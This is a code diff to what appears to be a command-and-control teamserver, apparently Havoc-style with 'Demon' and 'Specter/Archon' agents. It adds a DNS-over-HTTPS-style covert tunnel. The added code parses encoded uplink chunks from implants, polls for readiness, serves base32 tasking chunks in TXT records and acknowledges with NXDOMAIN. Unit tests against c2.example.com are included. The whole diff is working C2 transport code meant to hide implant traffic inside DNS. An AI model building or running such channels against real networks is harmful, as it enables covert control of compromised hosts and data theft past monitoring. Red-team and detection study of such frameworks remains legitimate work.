@@ -2302,14 +2302,22 @@ const DNS_FLAG_QR: u16 = 0x8000;
 const DNS_FLAG_AA: u16 = 0x0400;
 /// DNS RCODE: No Error.
 const DNS_RCODE_NOERROR: u16 = 0;
+/// DNS RCODE: NXDOMAIN (name does not exist).
+const DNS_RCODE_NXDOMAIN: u16 = 3;
 /// DNS RCODE: Refused.
 const DNS_RCODE_REFUSED: u16 = 5;
 /// Maximum age in seconds before a pending DNS upload is discarded.
 const DNS_UPLOAD_TIMEOUT_SECS: u64 = 120;
 /// How often the DNS listener prunes expired upload sessions.
 const DNS_UPLOAD_CLEANUP_INTERVAL_SECS: u64 = 30;
-/// Maximum number of chunks accepted for a single DNS upload.
+/// Maximum number of chunks accepted for a single legacy DNS upload.
 const DNS_MAX_UPLOAD_CHUNKS: u16 = 256;
+/// Maximum chunks for Specter/Archon DoH uplink (`<seq:04x><total:04x>` in the query name).
+const DNS_DOH_MAX_UPLOAD_CHUNKS: u16 = 1000;
+/// Downlink chunk size for DoH (matches `agent/specter` `CHUNK_BYTES`).
+const DNS_DOH_RESPONSE_CHUNK_BYTES: usize = 37;
+/// Session label length (`<session_hex16>` in DoH names).
+const DNS_DOH_SESSION_HEX_LEN: usize = 16;
 /// Maximum number of concurrent DNS upload sessions retained in memory.
 const DNS_MAX_PENDING_UPLOADS: usize = 1000;
 /// Maximum number of concurrent DNS upload sessions allowed per source IP.
@@ -2331,6 +2339,8 @@ const DNS_RESPONSE_CHUNK_BYTES: usize = 125;
 const DNS_MAX_DOWNLOAD_CHUNKS: usize = u16::MAX as usize;
 /// Base32hex alphabet (RFC 4648 §7): 0-9 followed by A-V.
 const BASE32HEX_ALPHABET: &[u8; 32] = b"0123456789ABCDEFGHIJKLMNOPQRSTUV";
+/// RFC 4648 base32 alphabet (lowercase).
+const BASE32_RFC4648_ALPHABET: &[u8; 32] = b"abcdefghijklmnopqrstuvwxyz234567";
 
 /// In-progress multi-chunk upload reassembly buffer for a DNS C2 agent.
 #[derive(Debug)]
@@ -2400,6 +2410,31 @@ enum DnsUploadAssembly {
 /// * `wait`              — no response queued for this agent
 /// * `<TOTAL> <B32HEX>` — total chunk count and the requested chunk
 /// * `done`              — `SEQ` is past the end of the response
+///
+/// ## Specter/Archon DoH grammar (same DNS listener, UDP authoritative)
+///
+/// Uplink (agent → teamserver), one TXT query per chunk:
+/// ```text
+/// <base32/rfc4648>.<seq:04x><total:04x>.<session_hex16>.u.<DOMAIN>
+/// ```
+///
+/// * `session_hex16` — 16 lowercase hex chars (8 random bytes)
+/// * Uplink chunks are acknowledged with **NXDOMAIN** (no TXT body)
+///
+/// Ready poll:
+/// ```text
+/// rdy.<session_hex16>.d.<DOMAIN>
+/// ```
+///
+/// * While the response is not ready: **NXDOMAIN**
+/// * When ready: TXT `\<total_chunks\>` as lowercase hexadecimal (no `0x` prefix)
+///
+/// Chunk fetch:
+/// ```text
+/// <seq:04x>.<session_hex16>.d.<DOMAIN>
+/// ```
+///
+/// * TXT record: **only** the base32/RFC4648 payload for that chunk (no `TOTAL` prefix)
 #[derive(Debug)]
 struct DnsListenerState {
     config: DnsListenerConfig,
@@ -2415,6 +2450,10 @@ struct DnsListenerState {
     uploads: Mutex<HashMap<u32, DnsPendingUpload>>,
     /// Pending responses keyed by agent ID.
     responses: Mutex<HashMap<u32, DnsPendingResponse>>,
+    /// DoH-style uploads keyed by session (16 hex chars).
+    doh_uploads: Mutex<HashMap<String, DnsPendingUpload>>,
+    /// DoH-style responses keyed by session; chunk strings are RFC4648 base32.
+    doh_responses: Mutex<HashMap<String, DnsPendingResponse>>,
 }
 
 impl DnsListenerState {
@@ -2454,6 +2493,8 @@ impl DnsListenerState {
             shutdown,
             uploads: Mutex::new(HashMap::new()),
             responses: Mutex::new(HashMap::new()),
+            doh_uploads: Mutex::new(HashMap::new()),
+            doh_responses: Mutex::new(HashMap::new()),
         }
     }
 
@@ -2488,6 +2529,37 @@ impl DnsListenerState {
             }
             DnsC2Query::Download { agent_id, seq } => {
                 let txt = self.handle_download(agent_id, seq).await;
+                Some(self.dns_c2_response_or_refused(
+                    query.id,
+                    &query.qname_raw,
+                    query.qtype,
+                    txt.as_bytes(),
+                ))
+            }
+            DnsC2Query::DohUpload { session, seq, total, data } => {
+                let ok = self.handle_doh_upload(session, seq, total, data, peer_ip).await;
+                if ok {
+                    Some(build_dns_nxdomain_response(query.id, &query.qname_raw, query.qtype))
+                } else {
+                    Some(build_dns_refused_response(query.id))
+                }
+            }
+            DnsC2Query::DohReady { session } => {
+                match self.handle_doh_ready(&session).await {
+                    Some(total_chunks) => {
+                        let txt = format!("{total_chunks:x}");
+                        Some(self.dns_c2_response_or_refused(
+                            query.id,
+                            &query.qname_raw,
+                            query.qtype,
+                            txt.as_bytes(),
+                        ))
+                    }
+                    None => Some(build_dns_nxdomain_response(query.id, &query.qname_raw, query.qtype)),
+                }
+            }
+            DnsC2Query::DohDownload { session, seq } => {
+                let txt = self.handle_doh_download(&session, seq).await;
                 Some(self.dns_c2_response_or_refused(
                     query.id,
                     &query.qname_raw,
@@ -2704,14 +2776,93 @@ impl DnsListenerState {
         true
     }
 
+    fn pending_doh_response_bytes(responses: &HashMap<String, DnsPendingResponse>) -> usize {
+        responses.values().map(|r| r.chunks.iter().map(|c| c.len()).sum::<usize>()).sum()
+    }
+
+    /// Same limits as [`Self::enforce_response_caps`], for session-keyed DoH responses.
+    fn enforce_doh_response_caps(
+        responses: &mut HashMap<String, DnsPendingResponse>,
+        incoming_session: &str,
+        incoming_chunks: &[String],
+        listener_name: &str,
+    ) -> bool {
+        let replaced = responses.remove(incoming_session);
+
+        let incoming_bytes: usize = incoming_chunks.iter().map(|c| c.len()).sum();
+
+        while responses.len() >= DNS_MAX_PENDING_RESPONSES {
+            let oldest_id =
+                responses.iter().min_by_key(|(_, r)| r.received_at).map(|(id, _)| id.clone());
+            let Some(evict_id) = oldest_id else { break };
+            warn!(
+                listener = %listener_name,
+                evicted_session = %evict_id,
+                pending_count = responses.len(),
+                max = DNS_MAX_PENDING_RESPONSES,
+                "evicting oldest pending DoH DNS response — count cap reached"
+            );
+            responses.remove(&evict_id);
+        }
+
+        let mut total_bytes = Self::pending_doh_response_bytes(responses);
+        while total_bytes + incoming_bytes > DNS_MAX_PENDING_RESPONSE_BYTES && !responses.is_empty()
+        {
+            let oldest_id =
+                responses.iter().min_by_key(|(_, r)| r.received_at).map(|(id, _)| id.clone());
+            let Some(evict_id) = oldest_id else { break };
+            let evicted_bytes: usize = responses
+                .get(&evict_id)
+                .map(|r| r.chunks.iter().map(|c| c.len()).sum())
+                .unwrap_or(0);
+            warn!(
+                listener = %listener_name,
+                evicted_session = %evict_id,
+                total_bytes,
+                incoming_bytes,
+                max_bytes = DNS_MAX_PENDING_RESPONSE_BYTES,
+                "evicting oldest pending DoH DNS response — byte cap reached"
+            );
+            responses.remove(&evict_id);
+            total_bytes -= evicted_bytes;
+        }
+
+        if incoming_bytes > DNS_MAX_PENDING_RESPONSE_BYTES {
+            warn!(
+                listener = %listener_name,
+                session = %incoming_session,
+                incoming_bytes,
+                max_bytes = DNS_MAX_PENDING_RESPONSE_BYTES,
+                "rejecting oversized DoH DNS response — single entry exceeds byte cap"
+            );
+            if let Some(old) = replaced {
+                responses.insert(incoming_session.to_owned(), old);
+            }
+            return false;
+        }
+
+        let _ = replaced;
+        true
+    }
+
     async fn cleanup_expired_uploads(&self) {
         let mut uploads = self.uploads.lock().await;
         uploads
             .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
         drop(uploads);
 
+        let mut doh_uploads = self.doh_uploads.lock().await;
+        doh_uploads
+            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
+        drop(doh_uploads);
+
         let mut responses = self.responses.lock().await;
         responses
+            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
+        drop(responses);
+
+        let mut doh_responses = self.doh_responses.lock().await;
+        doh_responses
             .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
     }
 
@@ -2733,6 +2884,123 @@ impl DnsListenerState {
         } else {
             format!("{} {}", total, pending.chunks[idx])
         }
+    }
+
+    async fn handle_doh_upload(
+        &self,
+        session: String,
+        seq: u16,
+        total: u16,
+        data: Vec<u8>,
+        peer_ip: IpAddr,
+    ) -> bool {
+        let assembled =
+            match self.try_assemble_doh_upload(&session, seq, total, data, peer_ip).await {
+            DnsUploadAssembly::Pending => return true,
+            DnsUploadAssembly::Rejected => return false,
+            DnsUploadAssembly::Complete(assembled) => assembled,
+        };
+
+        let Some(_callback_guard) = self.shutdown.try_track_callback() else {
+            return false;
+        };
+
+        if !is_valid_demon_callback_request(&assembled) {
+            warn!(
+                listener = %self.config.name,
+                session = %session,
+                "dns doh upload produced invalid demon packet; discarding"
+            );
+            return false;
+        }
+
+        if !allow_demon_init_for_ip(
+            &self.config.name,
+            &self.demon_init_rate_limiter,
+            peer_ip,
+            &assembled,
+        )
+        .await
+        {
+            return false;
+        }
+
+        match process_demon_transport(
+            &self.config.name,
+            &self.registry,
+            &self.database,
+            &self.parser,
+            &self.events,
+            &self.dispatcher,
+            &self.unknown_callback_probe_audit_limiter,
+            &assembled,
+            peer_ip.to_string(),
+        )
+        .await
+        {
+            Ok(response) => {
+                if !response.payload.is_empty() {
+                    let chunks = chunk_response_to_doh_b32(&response.payload);
+                    if chunks.len() > DNS_MAX_DOWNLOAD_CHUNKS {
+                        warn!(
+                            listener = %self.config.name,
+                            session = %session,
+                            payload_bytes = response.payload.len(),
+                            chunk_count = chunks.len(),
+                            max_chunks = DNS_MAX_DOWNLOAD_CHUNKS,
+                            "dns doh response exceeds u16 seq limit — dropping to prevent \
+                             silent truncation"
+                        );
+                        return false;
+                    }
+                    let mut responses = self.doh_responses.lock().await;
+                    let accepted = Self::enforce_doh_response_caps(
+                        &mut responses,
+                        &session,
+                        &chunks,
+                        &self.config.name,
+                    );
+                    if !accepted {
+                        return false;
+                    }
+                    responses.insert(
+                        session,
+                        DnsPendingResponse { chunks, received_at: Instant::now() },
+                    );
+                }
+                true
+            }
+            Err(error) => {
+                warn!(
+                    listener = %self.config.name,
+                    session = %session,
+                    %error,
+                    "dns doh upload demon processing failed"
+                );
+                false
+            }
+        }
+    }
+
+    /// `Some(n)` = ready with `n` total chunks; `None` = still processing (NXDOMAIN to client).
+    async fn handle_doh_ready(&self, session: &str) -> Option<usize> {
+        let responses = self.doh_responses.lock().await;
+        responses.get(session).map(|p| p.chunks.len())
+    }
+
+    async fn handle_doh_download(&self, session: &str, seq: u16) -> String {
+        let mut responses = self.doh_responses.lock().await;
+        let Some(pending) = responses.get(session) else {
+            return "wait".to_owned();
+        };
+
+        let idx = usize::from(seq);
+        let total = pending.chunks.len();
+        if idx >= total {
+            responses.remove(session);
+            return "done".to_owned();
+        }
+        pending.chunks[idx].clone()
     }
 
     /// Try to assemble a complete upload from buffered chunks.
@@ -2860,6 +3128,126 @@ impl DnsListenerState {
         uploads.remove(&agent_id);
         DnsUploadAssembly::Complete(assembled)
     }
+
+    async fn try_assemble_doh_upload(
+        &self,
+        session: &str,
+        seq: u16,
+        total: u16,
+        data: Vec<u8>,
+        peer_ip: IpAddr,
+    ) -> DnsUploadAssembly {
+        if total == 0 || total > DNS_DOH_MAX_UPLOAD_CHUNKS {
+            warn!(
+                listener = %self.config.name,
+                %session,
+                seq,
+                total,
+                max_total = DNS_DOH_MAX_UPLOAD_CHUNKS,
+                "dns doh upload rejected due to invalid total chunk count"
+            );
+            return DnsUploadAssembly::Rejected;
+        }
+
+        if seq >= total {
+            warn!(
+                listener = %self.config.name,
+                %session,
+                seq,
+                total,
+                "dns doh upload rejected because chunk sequence exceeds declared total"
+            );
+            return DnsUploadAssembly::Rejected;
+        }
+
+        let uploads = self.uploads.lock().await;
+        let legacy_count = uploads.len();
+        let mut doh_uploads = self.doh_uploads.lock().await;
+
+        if let Some(existing) = doh_uploads.get(session) {
+            if existing.peer_ip != peer_ip {
+                warn!(
+                    listener = %self.config.name,
+                    %session,
+                    %peer_ip,
+                    expected_peer_ip = %existing.peer_ip,
+                    "dns doh upload rejected due to source IP mismatch"
+                );
+                return DnsUploadAssembly::Rejected;
+            }
+
+            if existing.total != total {
+                warn!(
+                    listener = %self.config.name,
+                    %session,
+                    received_total = total,
+                    expected_total = existing.total,
+                    "dns doh upload rejected due to inconsistent chunk total"
+                );
+                doh_uploads.remove(session);
+                return DnsUploadAssembly::Rejected;
+            }
+        }
+
+        let combined_uploads = legacy_count + doh_uploads.len();
+        if !doh_uploads.contains_key(session) && combined_uploads >= DNS_MAX_PENDING_UPLOADS {
+            warn!(
+                listener = %self.config.name,
+                %session,
+                active_uploads = combined_uploads,
+                max_uploads = DNS_MAX_PENDING_UPLOADS,
+                "dns doh upload rejected because pending upload capacity has been reached"
+            );
+            return DnsUploadAssembly::Rejected;
+        }
+
+        if !doh_uploads.contains_key(session) {
+            let ip_count = uploads.values().filter(|u| u.peer_ip == peer_ip).count()
+                + doh_uploads.values().filter(|u| u.peer_ip == peer_ip).count();
+            if ip_count >= DNS_MAX_UPLOADS_PER_IP {
+                warn!(
+                    listener = %self.config.name,
+                    %session,
+                    %peer_ip,
+                    ip_count,
+                    max_per_ip = DNS_MAX_UPLOADS_PER_IP,
+                    "dns doh upload rejected because per-IP upload limit has been reached"
+                );
+                return DnsUploadAssembly::Rejected;
+            }
+        }
+
+        let entry = doh_uploads.entry(session.to_owned()).or_insert_with(|| DnsPendingUpload {
+            chunks: HashMap::new(),
+            total,
+            received_at: Instant::now(),
+            peer_ip,
+        });
+        entry.chunks.insert(seq, data);
+
+        let expected = entry.total;
+        if entry.chunks.len() < usize::from(expected) {
+            return DnsUploadAssembly::Pending;
+        }
+
+        let mut assembled = Vec::new();
+        for i in 0..expected {
+            match entry.chunks.get(&i) {
+                Some(chunk) => assembled.extend_from_slice(chunk),
+                None => {
+                    warn!(
+                        listener = %self.config.name,
+                        %session,
+                        "dns doh upload missing chunk {i}/{expected}; discarding"
+                    );
+                    doh_uploads.remove(session);
+                    return DnsUploadAssembly::Rejected;
+                }
+            }
+        }
+        doh_uploads.remove(session);
+        DnsUploadAssembly::Complete(assembled)
+    }
 }
 
 fn dns_allowed_query_types(record_types: &[String]) -> Option<Vec<u16>> {
@@ -2884,11 +3272,18 @@ fn dns_allowed_query_types(record_types: &[String]) -> Option<Vec<u16>> {
 }
 
 /// A parsed DNS C2 query from a Demon agent.
+#[derive(Debug)]
 enum DnsC2Query {
     /// Upload chunk: `<b32hex-data>.<seq>-<total>-<agentid>.up.<domain>`
     Upload { agent_id: u32, seq: u16, total: u16, data: Vec<u8> },
     /// Download request: `<seq>-<agentid>.dn.<domain>`
     Download { agent_id: u32, seq: u16 },
+    /// DoH uplink chunk (RFC4648 base32): `<b32>.<seq:04x><total:04x>.<session>.u.<domain>`
+    DohUpload { session: String, seq: u16, total: u16, data: Vec<u8> },
+    /// DoH ready poll: `rdy.<session>.d.<domain>`
+    DohReady { session: String },
+    /// DoH chunk fetch: `<seq:04x>.<session>.d.<domain>`
+    DohDownload { session: String, seq: u16 },
 }
 
 /// A minimally parsed DNS query sufficient for C2 processing.
@@ -2958,10 +3353,12 @@ fn parse_dns_query(buf: &[u8]) -> Option<ParsedDnsQuery> {
 /// Parse DNS labels into a [`DnsC2Query`] if they match the expected C2 format.
 ///
 /// Expected formats (labels listed from leftmost to rightmost, domain stripped):
-/// * Upload:   `["<b32>", "<seq>-<total>-<aid>", "up"]`
-/// * Download: `["<seq>-<aid>",                  "dn"]`
+/// * Legacy upload: `["<b32hex>", "<seq>-<total>-<aid>", "up"]`
+/// * Legacy download: `["<seq>-<aid>", "dn"]`
+/// * DoH upload: `["<b32>", "<seq:04x><total:04x>", "<session_hex16>", "u"]`
+/// * DoH ready: `["rdy", "<session_hex16>", "d"]`
+/// * DoH chunk: `["<seq:04x>", "<session_hex16>", "d"]`
 fn parse_dns_c2_query(labels: &[String], domain: &str) -> Option<DnsC2Query> {
-    // Strip the domain suffix labels from the right
     let domain_labels: Vec<&str> = domain.split('.').collect();
     let domain_label_count = domain_labels.len();
 
@@ -2969,7 +3366,6 @@ fn parse_dns_c2_query(labels: &[String], domain: &str) -> Option<DnsC2Query> {
         return None;
     }
 
-    // Verify domain suffix matches
     let suffix = &labels[labels.len() - domain_label_count..];
     if suffix.iter().zip(domain_labels.iter()).any(|(a, b)| a != b) {
         return None;
@@ -2977,21 +3373,55 @@ fn parse_dns_c2_query(labels: &[String], domain: &str) -> Option<DnsC2Query> {
 
     let c2_labels = &labels[..labels.len() - domain_label_count];
 
-    match c2_labels {
-        // Upload: [b32data, "seq-total-aid", "up"]
-        [b32data, ctrl, up] if up == "up" => {
-            let parts: Vec<&str> = ctrl.splitn(3, '-').collect();
-            if parts.len() != 3 {
+    match c2_labels.len() {
+        4 => {
+            let b32data = c2_labels.first()?;
+            let seqtotal = c2_labels.get(1)?;
+            let session = c2_labels.get(2)?;
+            let u = c2_labels.get(3)?;
+            if u != "u" || seqtotal.len() != 8 || !is_session_hex16(session) {
                 return None;
             }
-            let seq = u16::from_str_radix(parts[0], 16).ok()?;
-            let total = u16::from_str_radix(parts[1], 16).ok()?;
-            let agent_id = u32::from_str_radix(parts[2], 16).ok()?;
-            let data = base32hex_decode(b32data)?;
-            Some(DnsC2Query::Upload { agent_id, seq, total, data })
+            let seq = u16::from_str_radix(&seqtotal[..4], 16).ok()?;
+            let total = u16::from_str_radix(&seqtotal[4..], 16).ok()?;
+            let data = base32_rfc4648_decode(b32data)?;
+            Some(DnsC2Query::DohUpload {
+                session: session.clone(),
+                seq,
+                total,
+                data,
+            })
         }
-        // Download: ["seq-aid", "dn"]
-        [ctrl, dn] if dn == "dn" => {
+        3 => {
+            let a = c2_labels.first()?;
+            let b = c2_labels.get(1)?;
+            let c = c2_labels.get(2)?;
+            if a == "rdy" && c == "d" && is_session_hex16(b) {
+                return Some(DnsC2Query::DohReady { session: b.clone() });
+            }
+            if c == "up" {
+                let parts: Vec<&str> = b.splitn(3, '-').collect();
+                if parts.len() != 3 {
+                    return None;
+                }
+                let seq = u16::from_str_radix(parts[0], 16).ok()?;
+                let total = u16::from_str_radix(parts[1], 16).ok()?;
+                let agent_id = u32::from_str_radix(parts[2], 16).ok()?;
+                let data = base32hex_decode(a)?;
+                return Some(DnsC2Query::Upload { agent_id, seq, total, data });
+            }
+            if c == "d" && is_session_hex16(b) && a.len() == 4 {
+                let seq = u16::from_str_radix(a, 16).ok()?;
+                return Some(DnsC2Query::DohDownload { session: b.clone(), seq });
+            }
+            None
+        }
+        2 => {
+            let ctrl = c2_labels.first()?;
+            let dn = c2_labels.get(1)?;
+            if dn != "dn" {
+                return None;
+            }
             let parts: Vec<&str> = ctrl.splitn(2, '-').collect();
             if parts.len() != 2 {
                 return None;
@@ -3002,6 +3432,61 @@ fn parse_dns_c2_query(labels: &[String], domain: &str) -> Option<DnsC2Query> {
         }
         _ => None,
     }
+}
+
+fn is_session_hex16(s: &str) -> bool {
+    s.len() == DNS_DOH_SESSION_HEX_LEN && s.chars().all(|c| matches!(c, '0'..='9' | 'a'..='f'))
+}
+
+/// Encode bytes as lowercase RFC 4648 base32 (no padding).
+fn base32_rfc4648_encode(data: &[u8]) -> String {
+    if data.is_empty() {
+        return String::new();
+    }
+    let out_len = (data.len() * 8).div_ceil(5);
+    let mut out = Vec::with_capacity(out_len);
+    let mut buf: u64 = 0;
+    let mut bits: u32 = 0;
+    for &byte in data {
+        buf = (buf << 8) | u64::from(byte);
+        bits += 8;
+        while bits >= 5 {
+            bits -= 5;
+            out.push(BASE32_RFC4648_ALPHABET[((buf >> bits) & 0x1F) as usize]);
+        }
+    }
+    if bits > 0 {
+        out.push(BASE32_RFC4648_ALPHABET[((buf << (5 - bits)) & 0x1F) as usize]);
+    }
+    // SAFETY: alphabet is ASCII.
+    String::from_utf8(out).unwrap_or_default()
+}
+
+/// Decode lowercase RFC 4648 base32 (no padding). Rejects invalid characters.
+fn base32_rfc4648_decode(s: &str) -> Option<Vec<u8>> {
+    let mut buf: u64 = 0;
+    let mut bits: u32 = 0;
+    let mut out = Vec::with_capacity(s.len() * 5 / 8);
+    for ch in s.chars() {
+        let val = match ch {
+            'a'..='z' => u64::from(ch as u8 - b'a'),
+            '2'..='7' => u64::from(ch as u8 - b'2' + 26),
+            _ => return None,
+        };
+        buf = (buf << 5) | val;
+        bits += 5;
+        if bits >= 8 {
+            bits -= 8;
+            out.push((buf >> bits) as u8);
+            buf &= (1u64 << bits).saturating_sub(1);
+        }
+    }
+    Some(out)
+}
+
+/// Split a Demon response payload into RFC4648 base32 chunks for DoH DNS delivery.
+fn chunk_response_to_doh_b32(payload: &[u8]) -> Vec<String> {
+    payload.chunks(DNS_DOH_RESPONSE_CHUNK_BYTES).map(base32_rfc4648_encode).collect()
 }
 
 /// Encode `data` as uppercase base32hex (RFC 4648 §7) with no padding.
@@ -3158,6 +3643,24 @@ fn build_dns_c2_response(
     response.extend_from_slice(&rdata);
 
     Some(response)
+}
+
+/// Build a DNS NXDOMAIN response echoing the question (no answer records).
+///
+/// Used for Specter/Archon DoH uplink acknowledgements and ready-poll "not yet" probes.
+fn build_dns_nxdomain_response(query_id: u16, qname_raw: &[u8], qtype: u16) -> Vec<u8> {
+    let mut response = Vec::with_capacity(DNS_HEADER_LEN + qname_raw.len() + 4);
+    response.extend_from_slice(&query_id.to_be_bytes());
+    let flags: u16 = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NXDOMAIN;
+    response.extend_from_slice(&flags.to_be_bytes());
+    response.extend_from_slice(&1u16.to_be_bytes()); // qdcount
+    response.extend_from_slice(&0u16.to_be_bytes()); // ancount
+    response.extend_from_slice(&0u16.to_be_bytes()); // nscount
+    response.extend_from_slice(&0u16.to_be_bytes()); // arcount
+    response.extend_from_slice(qname_raw);
+    response.extend_from_slice(&qtype.to_be_bytes());
+    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());
+    response
 }
 
 /// Build a DNS REFUSED response for `query_id`.
@@ -3915,9 +4418,10 @@ mod tests {
     use std::time::{Instant, SystemTime, UNIX_EPOCH};
 
     use super::{
-        DEMON_INIT_WINDOW_DURATION, DNS_HEADER_LEN, DNS_MAX_DOWNLOAD_CHUNKS,
-        DNS_MAX_PENDING_RESPONSE_BYTES, DNS_MAX_PENDING_RESPONSES, DNS_MAX_PENDING_UPLOADS,
-        DNS_MAX_UPLOAD_CHUNKS, DNS_MAX_UPLOADS_PER_IP, DNS_RESPONSE_CHUNK_BYTES, DNS_TYPE_A,
+        DEMON_INIT_WINDOW_DURATION, DNS_DOH_RESPONSE_CHUNK_BYTES, DNS_HEADER_LEN,
+        DNS_MAX_DOWNLOAD_CHUNKS, DNS_MAX_PENDING_RESPONSE_BYTES, DNS_MAX_PENDING_RESPONSES,
+        DNS_MAX_PENDING_UPLOADS, DNS_MAX_UPLOAD_CHUNKS, DNS_MAX_UPLOADS_PER_IP,
+        DNS_RESPONSE_CHUNK_BYTES, DNS_TYPE_A,
         DNS_TYPE_CNAME, DNS_TYPE_TXT, DNS_UPLOAD_TIMEOUT_SECS, DemonInitRateLimiter,
         DnsListenerState, DnsPendingResponse, DnsPendingUpload, DnsUploadAssembly, DownloadTracker,
         ListenerEventAction, ListenerManager, ListenerManagerError, ListenerStatus,
@@ -3925,8 +4429,10 @@ mod tests {
         MAX_DEMON_INIT_ATTEMPTS_PER_IP, MAX_SMB_FRAME_PAYLOAD_LEN,
         MAX_UNKNOWN_CALLBACK_PROBE_AUDITS_PER_SOURCE, TrustedProxyPeer,
         UNKNOWN_CALLBACK_PROBE_AUDIT_WINDOW_DURATION, UnknownCallbackProbeAuditLimiter,
-        action_from_mark, base32hex_decode, base32hex_encode, build_dns_c2_response,
-        chunk_response_to_b32hex, collect_body_with_magic_precheck, dns_allowed_query_types,
+        action_from_mark, base32_rfc4648_decode, base32_rfc4648_encode, base32hex_decode,
+        base32hex_encode, build_dns_c2_response, build_dns_nxdomain_response,
+        chunk_response_to_b32hex, chunk_response_to_doh_b32, collect_body_with_magic_precheck,
+        dns_allowed_query_types,
         dns_wire_domain_from_ascii_payload, extract_external_ip, handle_external_request,
         is_past_kill_date, listener_config_from_operator, listener_error_event,
         listener_event_for_action, listener_removed_event, operator_protocol_name,
@@ -7220,6 +7726,81 @@ mod tests {
             .map(|s| s.to_string())
             .collect();
         assert!(parse_dns_c2_query(&labels, "c2.example.com").is_none());
+    }
+
+    #[test]
+    fn parse_dns_c2_query_recognises_doh_upload() {
+        let payload = b"hello";
+        let b32 = base32_rfc4648_encode(payload);
+        let seqtotal = format!("{:04x}{:04x}", 0u16, 1u16);
+        let session = "0123456789abcdef";
+        let labels: Vec<String> = [b32.as_str(), &seqtotal, session, "u", "c2", "example", "com"]
+            .iter()
+            .map(|s| s.to_string())
+            .collect();
+        let result = parse_dns_c2_query(&labels, "c2.example.com");
+        let Some(super::DnsC2Query::DohUpload { session: s, seq, total, data }) = result else {
+            panic!("expected DohUpload variant, got {result:?}");
+        };
+        assert_eq!(s, session);
+        assert_eq!(seq, 0);
+        assert_eq!(total, 1);
+        assert_eq!(data, payload);
+    }
+
+    #[test]
+    fn parse_dns_c2_query_recognises_doh_ready() {
+        let session = "0123456789abcdef";
+        let labels: Vec<String> = ["rdy", session, "d", "c2", "example", "com"]
+            .iter()
+            .map(|s| s.to_string())
+            .collect();
+        let result = parse_dns_c2_query(&labels, "c2.example.com");
+        let Some(super::DnsC2Query::DohReady { session: s }) = result else {
+            panic!("expected DohReady variant");
+        };
+        assert_eq!(s, session);
+    }
+
+    #[test]
+    fn parse_dns_c2_query_recognises_doh_chunk_download() {
+        let session = "fedcba9876543210";
+        let labels: Vec<String> = ["0003", session, "d", "c2", "example", "com"]
+            .iter()
+            .map(|s| s.to_string())
+            .collect();
+        let result = parse_dns_c2_query(&labels, "c2.example.com");
+        let Some(super::DnsC2Query::DohDownload { session: s, seq }) = result else {
+            panic!("expected DohDownload variant");
+        };
+        assert_eq!(s, session);
+        assert_eq!(seq, 3);
+    }
+
+    #[test]
+    fn build_dns_nxdomain_response_sets_rcode_3() {
+        let packet = build_dns_txt_query(0x4242, "rdy.testsession.d.c2.example.com");
+        let parsed = parse_dns_query(&packet).expect("parse failed");
+        let resp = build_dns_nxdomain_response(parsed.id, &parsed.qname_raw, parsed.qtype);
+        assert_eq!(resp[3] & 0x0F, 3u8);
+        assert_eq!(u16::from_be_bytes([resp[6], resp[7]]), 0, "no answers");
+    }
+
+    #[test]
+    fn chunk_response_to_doh_b32_round_trip() {
+        let payload = vec![0xABu8; 80];
+        let chunks = chunk_response_to_doh_b32(&payload);
+        assert_eq!(chunks.len(), 3); // ceil(80/37) = 3
+        let mut out = Vec::new();
+        for c in &chunks {
+            out.extend_from_slice(&base32_rfc4648_decode(c).expect("decode"));
+        }
+        assert_eq!(out, payload);
+    }
+
+    #[test]
+    fn dns_doh_chunk_size_matches_specter() {
+        assert_eq!(DNS_DOH_RESPONSE_CHUNK_BYTES, 37);
     }
 
     #[test]
